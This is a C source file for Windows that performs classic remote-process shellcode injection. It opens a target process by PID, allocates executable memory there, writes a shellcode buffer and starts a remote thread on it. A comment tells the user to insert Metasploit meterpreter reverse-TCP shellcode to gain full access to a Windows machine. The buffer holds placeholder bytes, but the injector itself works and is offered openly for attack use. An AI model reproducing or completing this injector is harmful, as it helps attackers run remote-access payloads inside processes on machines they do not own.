#include <stdio.h>
#include <windows.h>

const char *k = "[+]";
const char *i = "[*]";
const char *e = "[-]";

DWORD PID, TID = 0;
LPVOID rBuffer;
HANDLE hProcess, hThread = NULL;
// add the shellcode from meterpreter reverse tcp to gain full access to a windows machine
//  wont add it since github will flag it and block my account but here is where you inject your metasploit shellcode on the crowPuke variable
unsigned char crowPuke[] = "\x41\x41\x41\x41\x41\x41";
size_t crowSize = sizeof(crowPuke);

int main(int argc, char *argv[])
{

    if (argc < 2)
    {
        printf("%s You did not provide a PID!! Exiting....\n", e);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    printf("%s You provided the PID: (%ld)\n", i, PID);

    // OPEN A PROCESS ON THE PID PROVIDED TO GET THE HANDLER

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID);

    if (hProcess == NULL)
    {
        printf("%s Seems you were denied the handler to the process! PID : (%ld) , errorcode %ld \n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Handler to the PID : %ld obtained!...Its at: \n\\---0x%p\n", k, PID, hProcess);

    rBuffer = VirtualAllocEx(
        hProcess,
        0,
        crowSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE

    );

    printf("%s Allocated %zubytes for the shellcode!\n", i, crowSize);

    WriteProcessMemory(
        hProcess,
        rBuffer,
        crowPuke,
        crowSize,
        0);

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        NULL,
        &TID);

    if (hThread == NULL)
    {
        printf("%s Failed to create a thread to the PID: (%ld)\n", e, PID);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s Thread handle is at: \n\\---0x%p\n", k, hThread);
    WaitForSingleObject(hThread, INFINITE);

    printf("%s Cleaning up....\n", i);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    printf("%s Finished up......\n", k);

    return EXIT_SUCCESS;
}
 